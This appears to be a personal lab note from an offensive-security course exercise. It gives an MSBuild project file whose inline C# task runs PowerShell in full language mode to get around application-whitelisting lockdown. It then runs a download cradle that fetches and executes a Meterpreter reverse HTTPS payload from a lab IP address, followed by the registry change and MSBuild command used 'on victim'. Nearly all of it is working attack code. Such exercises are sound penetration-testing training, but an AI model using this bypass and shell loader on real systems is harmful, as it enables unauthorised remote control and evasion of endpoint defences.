```powershell
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe powaShell.csproj -->
  <Target Name="Hello">
   <ClassExample />
  </Target>
	<UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	<Task>
	 <Reference Include="C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" />
	 <!-- Your PowerShell Path May vary -->
      <Code Type="Class" Language="cs">
        <![CDATA[
			// all code by Casey Smith @SubTee
			using System;
			using System.Reflection;
			using Microsoft.Build.Framework;
			using Microsoft.Build.Utilities;
			
			using System.Collections.ObjectModel;
			using System.Management.Automation;
			using System.Management.Automation.Runspaces;
			using System.Text;
				
			public class ClassExample :  Task, ITask
			{
				public override bool Execute()
				{
					//Console.WriteLine("Hello From a Class.");
					Console.WriteLine(powaShell.RunPSCommand());
					return true;
				}
			}
			
			//Based on Jared Atkinson's And Justin Warner's Work
			public class powaShell
			{
				public static string RunPSCommand()
				{
										
					//Init stuff
					
					InitialSessionState iss = InitialSessionState.CreateDefault();
					iss.LanguageMode = PSLanguageMode.FullLanguage;
					Runspace runspace = RunspaceFactory.CreateRunspace(iss);
					runspace.Open();
					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
					Pipeline pipeline = runspace.CreatePipeline();
					
					//Interrogate LockDownPolicy
					Console.WriteLine(System.Management.Automation.Security.SystemPolicy.GetSystemLockdownPolicy());				
					
					
					
					//Add commands
					pipeline.Commands.AddScript("IEX (iwr -uri 'http://192.168.49.62/met_revhttps_443_x64_powershell_amsi.txt')");  // powershell 3.0+ download cradle
					//Prep PS for string output and invoke
					pipeline.Commands.Add("Out-String");
					Collection<PSObject> results = pipeline.Invoke();
					runspace.Close();
					//Convert records to strings
					StringBuilder stringBuilder = new StringBuilder();
					foreach (PSObject obj in results)
					{
						stringBuilder.Append(obj);
					}
					return stringBuilder.ToString().Trim();		  
				}
			}
							
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

Bypass has been achieved.
On victim following command had to be ran first:

```powershell
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Internet Explorer\Main" -Name "DisableFirstRunCustomize" -Value 2
```

This command helped because IE had to be initialized first.

MSBuild had to be ran this way:
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Tools\rev.csproj
```

[[Evasion Techniques and Breaching Defenses#8 4 5 2 Extra Mile]]

